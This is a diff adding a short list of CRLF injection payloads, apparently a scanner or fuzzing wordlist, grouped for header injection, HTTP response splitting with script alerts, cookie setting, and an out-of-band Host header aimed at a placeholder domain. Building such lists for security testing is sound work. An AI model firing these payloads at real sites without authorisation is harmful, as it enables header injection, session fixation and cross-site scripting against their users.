@@ -1,0 +1,17 @@
+##CRLF - Math (1337 in injected header)##
+%0d%0aInjected-Header:1337
+%0d%0aX-Injected:1337
+\r\nInjected:1337
+%E5%98%8A%E5%98%8DInjected:1337
+%0aInjected:1337
+%0dInjected:1337
+1337%0d%0aInjected:true
+1337%00%0d%0aInjected:true
+##CRLF - Error (response splitting)##
+%0d%0a%0d%0a<script>alert(1337)</script>
+%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(1337)</script>
+%0d%0aSet-Cookie:injected=1337
+%0d%0aX-XSS-Protection:0%0d%0a%0d%0a<script>alert(1337)</script>
+%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK%0d%0aContent-Type:text/html%0d%0aContent-Length:25%0d%0a%0d%0a<script>alert(1337)</script>
+##CRLF - OOB##
+%0d%0aHost:1337.{domain}
